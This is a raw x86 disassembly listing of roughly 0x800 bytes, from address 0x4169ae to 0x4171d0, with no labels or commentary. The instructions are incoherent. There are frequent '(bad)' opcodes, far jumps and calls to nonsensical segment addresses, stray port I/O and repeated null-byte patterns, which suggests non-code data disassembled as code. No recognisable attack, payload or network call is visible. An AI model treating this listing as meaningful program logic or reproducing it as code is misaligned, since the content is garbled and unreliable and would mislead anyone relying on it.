  4169ae:	sbb    DWORD PTR [ebx+0x6a],edx
  4169b1:	inc    edi
  4169b2:	sbb    edx,0x27504e2
  4169b8:	je     0x416941
  4169ba:	mov    DWORD PTR [eax],0x7da503e7
  4169c0:	call   0x0:0x6c
  4169c7:	je     0x4169cb
  4169c9:	out    0xdd,eax
  4169cb:	jmp    0x1ab2:0xcd71af7f
  4169d2:	jno    0x4169ac
  4169d4:	jbe    0x416a42
  4169d6:	inc    edx
  4169d7:	shr    BYTE PTR [edx-0x19],cl
  4169da:	jp     0x4169d0
  4169dc:	stc    
  4169dd:	in     al,dx
  4169de:	add    esi,DWORD PTR [ebp-0x28]
  4169e1:	out    dx,al
  4169e2:	jle    0x4169da
  4169e4:	inc    ebx
  4169e5:	call   0x5c13deed
  4169ea:	test   DWORD PTR [ebp+0x4],esi
  4169ed:	out    0x3,eax
  4169ef:	inc    ebp
  4169f0:	imul   edx,DWORD PTR [esi-0x24e7b],0x0
  4169f7:	jge    0x416a64
  4169f9:	std    
  4169fa:	jmp    0xe913e90a
  4169ff:	jbe    0x416a03
  416a01:	push   eax
  416a02:	ins    BYTE PTR es:[edi],dx
  416a03:	rcl    BYTE PTR ds:0xdc76e906,0xff
  416a0a:	imul   ebp,DWORD PTR [ecx+0x49c3e867],0xf272fd67
  416a14:	pop    esp
  416a15:	(bad)  
  416a16:	call   0x609f3191
  416a1b:	lock push es
  416a1d:	or     cl,ch
  416a1f:	jbe    0x4169ee
  416a21:	shl    ebp,0x76
  416a24:	aad    0x88
  416a26:	add    eax,0xe80856f6
  416a2b:	add    BYTE PTR [eax],al
  416a2d:	add    BYTE PTR [eax],al
  416a2f:	add    BYTE PTR [esi+0x2],dh
  416a32:	or     DWORD PTR [ecx+edx*4+0x68],0x576fefd
  416a3a:	nop
  416a3b:	jmp    0x5c916cb6
  416a40:	repnz push 0xfffffffe
  416a43:	out    0x85,al
  416a45:	pop    edx
  416a46:	popf   
  416a47:	pop    ss
  416a48:	jbe    0x416a4c
  416a4a:	adc    DWORD PTR [ebp+esi*2+0x2],0xd569f874
  416a52:	or     esi,DWORD PTR [edx+0x23]
  416a55:	add    cl,BYTE PTR [ebx-0x297b19c]
  416a5b:	mov    dh,0x2e
  416a5d:	aaa    
  416a5e:	xor    eax,0xc24176e8
  416a63:	icebp  
  416a64:	jbe    0x416a3b
  416a66:	mov    BYTE PTR [ebp+0x68f85ef1],cl
  416a6c:	push   edx
  416a6d:	(bad)  
  416a6e:	add    eax,0x8acf76e9
  416a73:	add    BYTE PTR [eax],bh
  416a75:	and    DWORD PTR [eax],edx
  416a77:	add    DWORD PTR [ebp+eax*1+0x5bfb9e8],ecx
  416a7e:	add    BYTE PTR [ebx+0x81a70],al
  416a84:	or     DWORD PTR [ecx+0x590f524],eax
  416a8a:	add    BYTE PTR [eax-0x27],dl
  416a8d:	inc    ecx
  416a8e:	and    DWORD PTR [esp+esi*4],ecx
  416a91:	push   eax
  416a92:	xor    eax,DWORD PTR [ecx]
  416a94:	add    BYTE PTR [eax],al
  416a96:	add    BYTE PTR [eax],al
  416a98:	add    BYTE PTR [esi+eiz*8+0x48],cl
  416a9c:	or     dh,dh
  416a9e:	loop   0x416a9c
  416aa0:	call   FWORD PTR [eax+ebp*8+0x43]
  416aa4:	and    al,0x54
  416aa6:	int    0x86
  416aa8:	aaa    
  416aa9:	dec    ebp
  416aaa:	add    eax,0x38718b5b
  416aaf:	mov    edi,0x4be61c04
  416ab4:	and    al,0x10
  416ab6:	dec    esi
  416ab7:	push   ebx
  416ab8:	lea    esp,[ebx-0x71]
  416abb:	std    
  416abc:	dec    DWORD PTR [ecx*8+0x51c3202]
  416ac3:	das    
  416ac4:	fcmovnb st,st(7)
  416ac6:	mov    ebp,0x553f4c7b
  416acb:	addr16 adc al,0x42
  416ace:	dec    esi
  416acf:	cld    
  416ad0:	je     0x416a52
  416ad2:	push   ds
  416ad3:	dec    edi
  416ad4:	push   ebx
  416ad5:	mov    ebx,0x8c11600a
  416ada:	(bad)  
  416adb:	ss ret 
  416add:	call   0x551c:0xcc0c8930
  416ae4:	inc    DWORD PTR [eax-0x3f0780ff]
  416aea:	jno    0x416b12
  416aec:	mov    BYTE PTR [ebp+0x4c],dh
  416aef:	add    eax,0x280775ff
  416af4:	adc    al,0xf8
  416af6:	fbld   TBYTE PTR [ebp-0x2ea55d01]
  416afc:	cld    
  416afd:	add    BYTE PTR [eax],al
  416aff:	add    BYTE PTR [eax],al
  416b01:	add    BYTE PTR [eax+0x754013a7],al
  416b07:	in     al,0xc7
  416b09:	and    edx,DWORD PTR [ebp-0x1e]
  416b0c:	test   BYTE PTR [esi-0x7efea48c],ch
  416b12:	mov    cl,0x56
  416b14:	mov    cl,0xff
  416b16:	shl    BYTE PTR [edi+edi*1+0x440b750c],1
  416b1d:	jmp    0x2401608c
  416b22:	jno    0x416ab0
  416b24:	ror    DWORD PTR [edx+0x2ec0a],cl
  416b2a:	jne    0x416aed
  416b2c:	mov    ds:0x3259752f,eax
  416b31:	fnstcw WORD PTR [esi+0x1c]
  416b34:	lock dec ebx
  416b36:	(bad)  
  416b37:	lods   al,BYTE PTR ds:[esi]
  416b38:	xlat   BYTE PTR ds:[ebx]
  416b39:	adc    eax,ebx
  416b3b:	test   eax,0x3959746e
  416b40:	rcl    BYTE PTR [eax+0x1a],cl
  416b43:	dec    edi
  416b44:	loope  0x416b54
  416b46:	mov    ch,0x59
  416b48:	sub    al,cl
  416b4a:	mov    ebp,DWORD PTR [edi+0x21450c80]
  416b50:	retf   
  416b51:	cld    
  416b52:	and    DWORD PTR [eax-0x7e],0x1ace89f8
  416b59:	mov    BYTE PTR [ebx+eax*8-0xa960305],cl
  416b60:	pop    ss
  416b61:	mov    esi,edx
  416b63:	lahf   
  416b64:	add    al,0x0
  416b66:	add    BYTE PTR [eax],al
  416b68:	add    BYTE PTR [eax],al
  416b6a:	add    BYTE PTR [ebp+0x9],dh
  416b6d:	ins    DWORD PTR es:[edi],dx
  416b6e:	adc    ecx,DWORD PTR [ecx-0x10003eb1]
  416b74:	add    ch,BYTE PTR [ebx]
  416b76:	sub    BYTE PTR [ebp-0x4dc29987],dl
  416b7c:	addr16 out 0x82,eax
  416b7f:	mov    cl,0xf6
  416b81:	push   esi
  416b82:	add    al,0x43
  416b84:	retf   
  416b85:	test   al,0xff
  416b87:	call   0x237b:0x885aa731
  416b8e:	sub    BYTE PTR [ecx-0x2d],dh
  416b91:	adc    al,0x81
  416b93:	lds    edx,FWORD PTR [eax+ebp*8+0x3]
  416b97:	jne    0x416bf3
  416b99:	and    BYTE PTR ds:0x4b1a0275,dh
  416b9f:	lods   al,BYTE PTR ds:[esi]
  416ba0:	inc    ebx
  416ba1:	retf   
  416ba2:	pop    ds
  416ba3:	(bad)  
  416ba4:	rcl    eax,cl
  416ba6:	pop    ss
  416ba7:	ret    
  416ba8:	sar    BYTE PTR ds:0x9a2296f7,cl
  416bae:	ror    BYTE PTR [ecx+0xd],cl
  416bb1:	(bad)  
  416bb2:	adc    al,0xb5
  416bb4:	add    ah,dl
  416bb6:	inc    edx
  416bb7:	mov    ebx,0x62ff6c10
  416bbc:	sub    dh,BYTE PTR [eax+0x69ffa16e]
  416bc2:	imul   ecx,DWORD PTR [ecx-0x7d84101b],0xffffffb2
  416bc9:	call   0xeb86199b
  416bce:	add    eax,DWORD PTR [eax]
  416bd0:	add    BYTE PTR [eax],al
  416bd2:	add    BYTE PTR [eax],al
  416bd4:	inc    edi
  416bd5:	inc    edx
  416bd6:	add    dh,BYTE PTR [esi+0x44]
  416bd9:	inc    edx
  416bda:	test   eax,0xe8d8fafc
  416bdf:	retf   
  416be0:	mov    ah,0xf5
  416be2:	out    0x86,al
  416be4:	jecxz  0x416bd3
  416be6:	in     al,dx
  416be7:	js     0x416c57
  416be9:	shl    BYTE PTR [ebx-0x58cc253f],cl
  416bef:	xchg   DWORD PTR [edx+0x4ddaffed],edi
  416bf5:	adc    ecx,DWORD PTR [esp+ebx*4-0x4c]
  416bf9:	data16 cmp bl,bl
  416bfc:	ret    0x3ff9
  416bff:	push   0x37
  416c01:	sbb    bh,BYTE PTR [ecx]
  416c03:	test   al,0xa7
  416c05:	jb     0x416b88
  416c07:	mov    eax,ds:0x1c514110
  416c0c:	sbb    al,0xd6
  416c0e:	and    ebp,ebp
  416c10:	cmc    
  416c11:	cmp    ebp,edi
  416c13:	mov    edx,0x7188cd3d
  416c18:	dec    esp
  416c19:	pop    ecx
  416c1a:	or     eax,0x1ed6d
  416c1f:	jmp    0x24916611
  416c24:	xor    al,0x66
  416c26:	xor    ch,BYTE PTR [ecx]
  416c28:	dec    ebx
  416c29:	sub    ecx,ecx
  416c2b:	mov    edi,0xad137b97
  416c30:	xchg   ebx,eax
  416c31:	ret    
  416c32:	jmp    DWORD PTR [ecx-0x39]
  416c35:	sub    eax,0xb51e
  416c3a:	add    BYTE PTR [eax],al
  416c3c:	add    BYTE PTR [esi+eiz*1],bh
  416c3f:	sub    DWORD PTR [edi],0x9bbf2b59
  416c45:	stos   BYTE PTR es:[edi],al
  416c46:	pop    ebx
  416c47:	or     DWORD PTR [edx-0x5f],esp
  416c4a:	fcomi  st,st(5)
  416c4c:	shl    DWORD PTR [ebp+0x70],0x89
  416c50:	add    DWORD PTR [edx],esp
  416c52:	sbb    edi,DWORD PTR [edi]
  416c54:	xchg   edx,eax
  416c55:	dec    edi
  416c56:	sbb    bh,BYTE PTR [esi-0x3cb45b]
  416c5c:	add    BYTE PTR [esp+edi*4],bh
  416c5f:	cld    
  416c60:	out    0xf2,al
  416c62:	inc    edx
  416c63:	je     0x416c8d
  416c65:	ins    BYTE PTR es:[edi],dx
  416c66:	sub    DWORD PTR [eax-0x5c],edx
  416c69:	mov    ch,0x65
  416c6b:	(bad)  
  416c6c:	in     al,0xc6
  416c6e:	cmp    BYTE PTR [ecx+0x0],al
  416c71:	int3   
  416c72:	jmp    0x34ff:0xa0a6bf2
  416c79:	nop
  416c7a:	and    eax,0x688003f
  416c7f:	dec    edi
  416c80:	push   ebx
  416c81:	jg     0x416cd6
  416c83:	xchg   BYTE PTR [esi],ch
  416c85:	and    al,0x37
  416c87:	add    edi,edi
  416c89:	test   eax,0x8c400fd5
  416c8e:	or     BYTE PTR [esi+0x1c],0xf3
  416c92:	call   0x374674dc
  416c97:	or     DWORD PTR [ecx+0x5e850e62],ecx
  416c9d:	test   al,0xe8
  416c9f:	pop    ebp
  416ca0:	sbb    BYTE PTR [eax],al
  416ca2:	add    BYTE PTR [eax],al
  416ca4:	add    BYTE PTR [eax],al
  416ca6:	add    eax,0x32891d37
  416cab:	sbb    eax,0x3622c787
  416cb0:	pop    edx
  416cb1:	pop    ebx
  416cb2:	mov    ?,ebp
  416cb4:	call   DWORD PTR [ebp-0x19]
  416cb7:	icebp  
  416cb8:	data16 mul BYTE PTR [ebx+eax*1+0x31]
  416cbd:	dec    esp
  416cbe:	xchg   ecx,eax
  416cbf:	inc    edx
  416cc0:	std    
  416cc1:	push   esi
  416cc2:	xchg   ebx,eax
  416cc3:	outs   dx,DWORD PTR ds:[esi]
  416cc4:	add    eax,0xfb012a83
  416cc9:	adc    eax,0x401220
  416cce:	sub    DWORD PTR [edi+0x9],0xffffffe8
  416cd2:	adc    bh,BYTE PTR [esi]
  416cd4:	cld    
  416cd5:	push   DWORD PTR [ebx+0x6f]
  416cd8:	or     eax,0xe80cda8b
  416cdd:	stos   DWORD PTR es:[edi],eax
  416cde:	jl     0x416cb6
  416ce0:	cli    
  416ce1:	dec    DWORD PTR [edx+0x4b0be7f9]
  416ce7:	fsqrt  
  416ce9:	mov    ecx,DWORD PTR [edx+0x22]
  416cec:	xor    esi,0x5601c775
  416cf2:	int    0x35
  416cf4:	mov    al,0x0
  416cf6:	jne    0x416d72
  416cf8:	aam    0xca
  416cfa:	ss pop ebx
  416cfc:	jle    0x416cf6
  416cfe:	lock call 0xcab5:0x4dee42f0
  416d06:	ss pop ebx
  416d08:	jle    0x416cd2
  416d0a:	add    BYTE PTR [eax],al
  416d0c:	add    BYTE PTR [eax],al
  416d0e:	add    BYTE PTR [esi],bl
  416d10:	mov    dl,0x1c
  416d12:	mov    edi,DWORD PTR [ecx]
  416d14:	push   0x49
  416d16:	sbb    DWORD PTR [ebx+ebx*2-0x10],0x1c91f605
  416d1e:	dec    ebp
  416d1f:	or     dh,ch
  416d21:	sub    al,0xf8
  416d23:	add    DWORD PTR [eax+eax*4],esi
  416d26:	std    
  416d27:	or     BYTE PTR [ebp-0x2d],al
  416d2a:	out    0xae,eax
  416d2c:	xchg   esp,eax
  416d2d:	push   0xfffffffd
  416d2f:	xchg   esp,eax
  416d30:	push   es
  416d31:	mov    eax,0x5e59b6ca
  416d36:	or     eax,0xc6dd04ee
  416d3b:	lea    edi,[ebx-0x48]
  416d3e:	retf   0x59b6
  416d41:	pop    ecx
  416d42:	repnz mov al,0x2c
  416d45:	imul   eax,DWORD PTR [edi+0x41388980],0xc0c73c75
  416d4f:	enter  0x57f0,0x4f
  416d53:	les    esp,FWORD PTR [ebx-0x675b6757]
  416d59:	add    ebp,edi
  416d5b:	inc    ebp
  416d5c:	repz mov esi,0xa781df7
  416d62:	add    BYTE PTR [ebp-0x20],dh
  416d65:	out    dx,al
  416d66:	pop    es
  416d67:	stc    
  416d68:	sbb    ecx,edi
  416d6a:	xor    edx,0x2
  416d6d:	out    0x3,eax
  416d6f:	jne    0x416de8
  416d71:	and    al,0x14
  416d73:	add    BYTE PTR [eax],al
  416d75:	add    BYTE PTR [eax],al
  416d77:	add    ah,dh
  416d79:	push   0x1a
  416d7b:	lock test eax,0x66c1cf7f
  416d81:	xor    BYTE PTR [edx+0x6b],ch
  416d84:	pop    ecx
  416d85:	out    dx,al
  416d86:	or     eax,DWORD PTR [edi-0xbc42b33]
  416d8c:	in     eax,dx
  416d8d:	mov    ch,0xd2
  416d8f:	xchg   BYTE PTR [esi+0x66],dl
  416d92:	out    0x86,eax
  416d94:	push   ss
  416d95:	cli    
  416d96:	out    0x78,al
  416d98:	ss cli 
  416d9a:	ss jns 0x416dd3
  416d9d:	data16 aaa 
  416d9f:	imul   esp,DWORD PTR [esi],0xa
  416da2:	sbb    eax,0xe6f79c5c
  416da7:	add    esi,esi
  416da9:	inc    edx
  416daa:	cld    
  416dab:	shr    DWORD PTR [eax],cl
  416dad:	pop    edx
  416dae:	sub    dl,BYTE PTR [esi*2-0x3a44adfe]
  416db5:	retf   
  416db6:	popf   
  416db7:	das    
  416db8:	ds mov edi,0xd61d2e6
  416dbe:	repz push ss
  416dc0:	mov    ch,0x2
  416dc2:	dec    edi
  416dc3:	das    
  416dc4:	push   ebx
  416dc5:	arpl   WORD PTR [esi],di
  416dc7:	xor    eax,0x6a2f7f2c
  416dcc:	leave  
  416dcd:	pop    es
  416dce:	(bad)  
  416dcf:	clc    
  416dd0:	scas   al,BYTE PTR es:[edi]
  416dd1:	xor    eax,0x429c03aa
  416dd6:	iret   
  416dd7:	sub    ecx,ecx
  416dd9:	cli    
  416dda:	jmp    0x0:0xef
  416de1:	outs   dx,BYTE PTR ds:[esi]
  416de2:	arpl   WORD PTR [ebx-0x239c8d05],dx
  416de8:	outs   dx,DWORD PTR ds:[esi]
  416de9:	gs ret 0x69e6
  416ded:	xor    al,0xcb
  416def:	push   ebp
  416df1:	jb     0x416dfd
  416df3:	adc    DWORD PTR [ecx-0x3d7c3a8a],ebp
  416df9:	shr    dh,0x5
  416dfc:	push   0xffffffd2
  416dfe:	repnz arpl WORD PTR [ebp-0x77],bx
  416e02:	gs jae 0x416df6
  416e05:	dec    ebp
  416e06:	out    dx,eax
  416e07:	adc    eax,esi
  416e09:	loop   0x416dfd
  416e0b:	cld    
  416e0c:	xor    al,0xcd
  416e0e:	int3   
  416e0f:	cld    
  416e10:	sbb    al,0x51
  416e12:	(bad)  
  416e13:	(bad)  
  416e14:	stos   DWORD PTR es:[edi],eax
  416e15:	add    cl,BYTE PTR gs:[edi+0x3a]
  416e19:	ret    0xd779
  416e1c:	fiadd  DWORD PTR [ebx+0x29]
  416e1f:	fistp  DWORD PTR [esp+esi*2]
  416e22:	xor    al,al
  416e24:	sbb    BYTE PTR [ebp-0x5116029d],0xf2
  416e2b:	retf   0x712a
  416e2e:	gs adc ebx,ebp
  416e31:	imul   eax,edx,0x1eb5a6ff
  416e37:	or     ecx,ebp
  416e39:	lahf   
  416e3a:	sub    eax,0x62302c28
  416e3f:	je     0x416e34
  416e41:	xor    esi,DWORD PTR [ebp+0xe867]
  416e47:	add    BYTE PTR [eax],al
  416e49:	add    BYTE PTR [esi+0x6],dh
  416e4c:	add    BYTE PTR [esi-0x7e],al
  416e4f:	dec    edx
  416e50:	adc    ch,BYTE PTR [ecx+0x2428a376]
  416e56:	cmp    BYTE PTR [edx+0x3a],ah
  416e59:	and    al,0x3c
  416e5b:	xchg   cl,cl
  416e5d:	jmp    0xecca70d8
  416e62:	dec    bp
  416e64:	inc    ecx
  416e65:	jmp    0x1c7ab0d3
  416e6a:	daa    
  416e6b:	test   BYTE PTR [eax-0x3705cf00],0x43
  416e72:	sbb    al,0x2d
  416e74:	sbb    al,0x82
  416e76:	sbb    esp,edx
  416e78:	xchg   BYTE PTR [eax],al
  416e7a:	or     al,0x6
  416e7c:	inc    eax
  416e7d:	cmp    ebx,DWORD PTR ds:0x5956e958
  416e83:	pop    ecx
  416e84:	mov    al,BYTE PTR [esp+ecx*8]
  416e87:	add    eax,0x18d8be00
  416e8c:	aas    
  416e8d:	add    BYTE PTR [edx+edx*4-0x1df400bc],ah
  416e94:	mov    edi,0x75500f
  416e99:	add    ah,cl
  416e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e9c:	xor    ch,cl
  416e9e:	pop    edi
  416e9f:	push   es
  416ea0:	xchg   DWORD PTR ds:0x3f18b8,ecx
  416ea6:	pop    ss
  416ea7:	xor    ah,dl
  416ea9:	adc    cl,BYTE PTR [esi+eax*1+0x53]
  416ead:	push   0x0
  416eaf:	add    BYTE PTR [eax],al
  416eb1:	add    BYTE PTR [eax],al
  416eb3:	mov    edi,0xb811bdc
  416eb8:	pusha  
  416eb9:	sub    eax,0x51064fcd
  416ebe:	inc    ecx
  416ec0:	std    
  416ec1:	enter  0x5c43,0xea
  416ec5:	aad    0x8b
  416ec7:	aam    0x2e
  416ec9:	stc    
  416eca:	je     0x416ef5
  416ecc:	aas    
  416ecd:	or     BYTE PTR [ebp-0x55],dl
  416ed0:	xor    BYTE PTR [eax],ch
  416ed2:	int    0x1f
  416ed4:	add    eax,0xd5c7d6fb
  416ed9:	ss cmc 
  416edb:	xlat   BYTE PTR ds:[ebx]
  416edc:	clc    
  416edd:	iret   
  416ede:	adc    cl,BYTE PTR [eax*1+0x5063b74]
  416ee5:	push   ebx
  416ee6:	push   esi
  416ee7:	push   edx
  416ee8:	add    edi,DWORD PTR [edx+0x2797589]
  416eee:	(bad)  
  416eef:	mov    bl,0x66
  416ef1:	fld    st(4)
  416ef3:	mov    ebx,0xb453ec71
  416ef8:	imul   edi,DWORD PTR [edi],0x46
  416efb:	outs   dx,DWORD PTR ds:[esi]
  416efc:	sub    al,0x59
  416efe:	jl     0x416e81
  416f00:	imul   eax,DWORD PTR [ecx],0xffffff83
  416f03:	mov    ch,0xbe
  416f05:	cmc    
  416f06:	lds    esi,FWORD PTR [ecx]
  416f08:	pop    es
  416f09:	adc    edi,edi
  416f0b:	iret   
  416f0c:	or     edi,DWORD PTR [esi]
  416f0e:	inc    esp
  416f0f:	xchg   ecx,eax
  416f10:	fs add al,0xe9
  416f13:	jae    0x416f16
  416f15:	(bad)  
  416f17:	add    BYTE PTR [eax],al
  416f19:	add    BYTE PTR [eax],al
  416f1b:	add    bl,cl
  416f1d:	push   ebp
  416f1e:	sbb    ebx,ecx
  416f20:	imul   esp,DWORD PTR ss:[esi-0x2d],0x22
  416f25:	lds    eax,FWORD PTR [ebx]
  416f27:	std    
  416f28:	push   0x75413833
  416f2d:	or     BYTE PTR [edi-0x3],0x70
  416f31:	cmp    edi,DWORD PTR [eax]
  416f33:	inc    ecx
  416f34:	jne    0x416f66
  416f36:	(bad)  
  416f37:	addr16 gs xchg esi,eax
  416f3a:	sar    edi,0x8b
  416f3d:	xor    eax,0x6b351109
  416f42:	ja     0x416f88
  416f44:	push   ecx
  416f45:	fs enter 0xcc58,0x2c
  416f4a:	iret   
  416f4b:	mov    BYTE PTR [ecx-0x13],bl
  416f4e:	push   edi
  416f4f:	or     al,0xc6
  416f51:	lahf   
  416f52:	jp     0x416f87
  416f54:	rcl    DWORD PTR [esi-0x3f],1
  416f57:	jmp    FWORD PTR [ebx+0x2d88fd33]
  416f5d:	cmp    DWORD PTR [eax+0x43],0x43787a41
  416f64:	inc    ecx
  416f65:	jp     0x416f3e
  416f67:	inc    bh
  416f69:	add    dh,BYTE PTR [eax-0x17]
  416f6c:	cs pusha 
  416f6e:	xor    eax,0xf6d73581
  416f73:	jp     0x416f23
  416f75:	push   esi
  416f76:	fs cmp eax,0x9a0f0989
  416f7c:	or     esp,DWORD PTR [eax-0x2]
  416f7f:	jg     0x416f81
  416f81:	add    BYTE PTR [eax],al
  416f83:	add    BYTE PTR [eax],al
  416f85:	xor    eax,0xb678d5d7
  416f8a:	pop    esi
  416f8b:	xchg   edi,eax
  416f8c:	js     0x416fc4
  416f8e:	pop    edx
  416f8f:	aaa    
  416f90:	fiadd  DWORD PTR [edi-0x2117904d]
  416f96:	pop    edi
  416f97:	mov    ebp,0xddd6b580
  416f9c:	or     BYTE PTR [esi+0x5a],0xe7
  416fa0:	out    dx,eax
  416fa1:	jae    0x416f2e
  416fa3:	sbb    al,0x6c
  416fa5:	int3   
  416fa6:	popf   
  416fa7:	stc    
  416fa8:	inc    ebx
  416fa9:	int3   
  416faa:	add    al,0x77
  416fac:	add    al,0x50
  416fae:	rol    BYTE PTR [ecx+0x3d],0xb4
  416fb2:	mov    ch,0x6b
  416fb4:	xlat   BYTE PTR ds:[ebx]
  416fb5:	push   esi
  416fb6:	mov    ch,BYTE PTR [eax+0x57]
  416fb9:	and    DWORD PTR [ecx],eax
  416fbb:	out    0x3,eax
  416fbd:	and    al,0xb8
  416fbf:	jno    0x416ff1
  416fc1:	imul   esi,ebx,0x13280426
  416fc7:	jbe    0x416fa4
  416fc9:	inc    esi
  416fca:	dec    ebp
  416fcb:	sub    al,BYTE PTR [esp+edi*8]
  416fce:	cmp    DWORD PTR [eax+0x28],esi
  416fd1:	mov    ecx,0xfa03aa4d
  416fd6:	sbb    al,0xb7
  416fd8:	cmp    BYTE PTR [edx+eax*1+0x26df4d4e],dh
  416fdf:	sahf   
  416fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fe1:	gs dec ebp
  416fe3:	stos   BYTE PTR es:[edi],al
  416fe4:	add    ebp,DWORD PTR [eax+0xdc005f]
  416fea:	add    BYTE PTR [eax],al
  416fec:	add    BYTE PTR [eax],al
  416fee:	ss cmc 
  416ff0:	aas    
  416ff1:	jmp    0xbe4db5ed
  416ff6:	xchg   ebx,eax
  416ff7:	cmp    BYTE PTR [eax+0x414f5edc],al
  416ffd:	jmp    0x42c77d73
  417002:	jns    0x417006
  417004:	add    BYTE PTR [edi+edi*4-0x2a],ch
  417008:	xor    al,0x87
  41700a:	neg    DWORD PTR [eax]
  41700c:	add    BYTE PTR [ebp+0x41],bh
  41700f:	in     al,dx
  417010:	inc    ecx
  417011:	pop    esp
  417012:	in     eax,0xce
  417014:	push   edi
  417015:	sar    DWORD PTR [edi+0x26],1
  417018:	(bad)  
  417019:	call   0x5ccc8fda
  41701e:	sub    DWORD PTR [edx+0x5f72dee7],edi
  417024:	std    
  417025:	sbb    dl,BYTE PTR [eax-0xd]
  417028:	(bad)  
  417029:	(bad)  [esi+0x712d8c5e]
  41702f:	add    al,0x50
  417031:	sbb    cl,bh
  417033:	pop    edi
  417034:	mov    WORD PTR [ecx+eax*8],gs
  417037:	into   
  417038:	mov    BYTE PTR [edi-0x3fa39937],ah
  41703e:	jbe    0x417042
  417040:	push   0x2a
  417042:	or     dl,bl
  417044:	ret    
  417045:	and    DWORD PTR [ecx],ebp
  417047:	addr16 and eax,ebp
  41704a:	jbe    0x417038
  41704c:	inc    ebx
  41704d:	mov    dh,BYTE PTR fs:[edx+0x8157]
  417054:	add    BYTE PTR [eax],al
  417056:	add    BYTE PTR [ebx+0x4ce8ff23],bh
  41705c:	ror    DWORD PTR [edx-0x1845592c],0x3a
  417063:	xchg   esp,eax
  417064:	pop    ebp
  417065:	std    
  417066:	pop    esp
  417067:	adc    dh,BYTE PTR [edx+0x3a190086]
  41706d:	mov    dh,al
  41706f:	lds    ebx,FWORD PTR [ebp+0x39f98d69]
  417075:	les    eax,FWORD PTR [ebp-0x18]
  417078:	add    eax,DWORD PTR [eax]
  41707a:	add    BYTE PTR [ebx+ebx*8],bl
  41707d:	sbb    eax,0xc19d9153
  417082:	push   eax
  417083:	ret    
  417084:	add    DWORD PTR [eax],eax
  417086:	add    BYTE PTR [ebx+ebx*8-0x17e173e],bl
  41708d:	(bad)  
  41708e:	call   FWORD PTR [ecx-0x70e98c3a]
  417094:	cmp    eax,0x5df6006d
  417099:	mov    al,BYTE PTR [ebp+0x4c]
  41709c:	ss addr16 add al,0x9f
  4170a0:	aad    0x40
  4170a2:	les    ebx,FWORD PTR [esi+edi*4+0x1dc28f4]
  4170a9:	jg     0x417071
  4170ab:	fsub   st,st(6)
  4170ad:	dec    eax
  4170ae:	je     0x417039
  4170b0:	sbb    ebp,DWORD PTR [edx+0x46]
  4170b3:	push   ecx
  4170b4:	ins    BYTE PTR es:[edi],dx
  4170b5:	rcr    DWORD PTR [eax-0x4c],1
  4170b8:	and    BYTE PTR [bx+di],al
  4170bb:	add    BYTE PTR [eax],al
  4170bd:	add    BYTE PTR [eax],al
  4170bf:	add    BYTE PTR [ebx+edi*1-0x657672bc],bl
  4170c6:	push   ebp
  4170c7:	call   0x3e944b
  4170cc:	xor    DWORD PTR [ecx+esi*2+0x2f016650],ebx
  4170d3:	fistp  DWORD PTR [edi-0x2b]
  4170d6:	inc    eax
  4170d7:	aam    0x5c
  4170d9:	dec    edi
  4170da:	xchg   BYTE PTR [ebp+0x68],bh
  4170dd:	out    0x10,al
  4170df:	and    al,0x6c
  4170e1:	inc    ecx
  4170e2:	std    
  4170e3:	test   BYTE PTR [esp+ebp*2+0x2d758b0a],cl
  4170ea:	ror    DWORD PTR [edx-0x6fa6c838],1
  4170f0:	pushf  
  4170f1:	imul   eax,DWORD PTR [ecx],0xffffffe9
  4170f4:	ja     0x41714f
  4170f6:	inc    ecx
  4170f7:	test   BYTE PTR ds:0xb88b109f,dh
  4170fd:	jg     0x4170d0
  4170ff:	mov    dh,BYTE PTR [eax+0x3a88d11f]
  417105:	repz or BYTE PTR [eax],ch
  417108:	jne    0x417175
  41710a:	jle    0x4170cc
  41710c:	mov    DWORD PTR [ebx-0x29],edx
  41710f:	add    edi,eax
  417111:	lods   eax,DWORD PTR ds:[esi]
  417112:	icebp  
  417113:	dec    edi
  417114:	(bad)  
  417115:	addr16 jbe 0x41715b
  417118:	test   eax,0xc943767b
  41711d:	jp     0x417199
  41711f:	pop    ebx
  417120:	xor    eax,DWORD PTR gs:[esi+0x28]
  417127:	add    BYTE PTR [eax],al
  417129:	jne    0x417196
  41712b:	jmp    0x417174
  41712d:	call   0xdd9a18ef
  417132:	cmp    esp,DWORD PTR [esi]
  417134:	dec    edx
  417136:	mov    al,0xca
  417138:	mov    cl,BYTE PTR [eax+0x3]
  41713b:	mov    esp,0x30871e7
  417140:	add    BYTE PTR [edi],bl
  417142:	and    DWORD PTR [edi+0x6bc34973],ecx
  417148:	not    DWORD PTR [edi+0x6a]
  41714b:	add    DWORD PTR [ebx+0x438c3330],ecx
  417151:	cmp    eax,esp
  417153:	dec    ecx
  417154:	xchg   DWORD PTR [eax],esi
  417156:	adc    ecx,DWORD PTR [ebx-0x385bf6a5]
  41715c:	outs   dx,DWORD PTR ds:[esi]
  41715d:	jo     0x4171ca
  41715f:	add    DWORD PTR [eax],eax
  417161:	jb     0x4171ba
  417163:	aad    0x8a
  417165:	mov    al,0x2
  417167:	mov    esi,DWORD PTR [esp+ecx*8+0x1e90c1cb]
  41716e:	pop    es
  41716f:	push   esi
  417170:	arpl   WORD PTR [eax+0x6b],dx
  417173:	repz mov ecx,0xbca05c49
  417179:	test   DWORD PTR [edx-0x43],0x6400cf20
  417180:	loope  0x417138
  417182:	mov    esp,0x8dc40361
  417187:	ins    BYTE PTR es:[edi],dx
  417188:	or     BYTE PTR [eax],ah
  41718a:	pop    esp
  41718b:	push   ds
  41718c:	mov    ah,0x0
  41718e:	add    BYTE PTR [eax],al
  417190:	add    BYTE PTR [eax],al
  417192:	loop   0x417195
  417194:	out    0x3,eax
  417196:	cmc    
  417197:	push   0x78
  417199:	sub    esi,DWORD PTR [ebp+0x2]
  41719c:	ins    BYTE PTR es:[edi],dx
  41719d:	inc    esp
  41719e:	mov    ecx,edi
  4171a0:	imul   ebp,ecx,0x781028e
  4171a6:	inc    ch
  4171a8:	jp     0x41715d
  4171aa:	pop    esp
  4171ab:	push   es
  4171ac:	cmp    dl,BYTE PTR [ecx+0x62de06f6]
  4171b2:	fdiv   DWORD PTR [edx+0x2985dbe]
  4171b8:	out    0x86,eax
  4171ba:	mov    al,0x6
  4171bc:	xor    eax,0x245bbbd9
  4171c1:	fdivr  DWORD PTR [ecx+0x12d936cd]
  4171c7:	mov    esp,0x45f5bf0c
  4171cc:	pop    ds
  4171cd:	dec    ebp
  4171ce:	mov    ah,0xb5
  4171d0:	jno    0x417241
